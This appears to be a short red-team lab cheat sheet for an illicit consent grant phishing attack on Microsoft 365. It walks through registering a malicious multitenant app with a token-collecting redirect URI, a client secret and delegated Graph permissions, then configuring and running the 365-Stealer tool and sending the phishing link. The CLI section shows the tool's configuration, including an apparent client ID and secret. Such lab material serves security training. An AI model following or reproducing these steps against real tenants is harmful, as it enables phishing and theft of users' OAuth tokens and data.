# Illicit Consent Grant Attack
![test](/img/illicit_consent_grant_attack.png "Illicit Consent Grant Attack").

1. Register a multitenant application attacker in defcorpextcontractors tenant
2. Provide the redirect URI where you would like to receive tokens. `https://172.16.151.X/login/authorized`
3. Go to the `Certificates&Secrets` blade and create new client secret. Copy the client secret before browsing away from the page
4. Go to the `API permissions` blade and add the following Delegated permissions for;
    - `Microsoft Graph:user.read`
    - `User.ReadBasic.All`
5. Setup [365-Stealer](#365-Stealer) via GUI or cli
6. Send the phishing link

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>



# 365-Stealer 
***Configure 365-Stealer from GUI***
  - Copy the `365-Stealer` directory to `C:\xampp\htdocs`
  - `http://localhost:82/365-stealer/yourVictims` and click `365-Stealer Configuration`
  - Enter CLIENTID, REDIRECTURL and CLIENTSSECRET 
  - Run 365-Stealer

<br>
<br>

***Configure 365-Stealer from cli***
```python
python 365-stealer.ph --set-config

Client ID ==> e06c6a0c-27bc-433a-b06e-5ef5ab0530af
Client Secret ==> am0ZV1a7xms6nW_AwMqAE~~kco1nNcBc.L
Redirect Url ==> https://172.16.150.X/login/authorized
Redirect Url After Stealing ==>
Macros File Path ==>
OneDrive Extensions ==>
Delay ==> 1

python 365-Stealer.py --run-app
```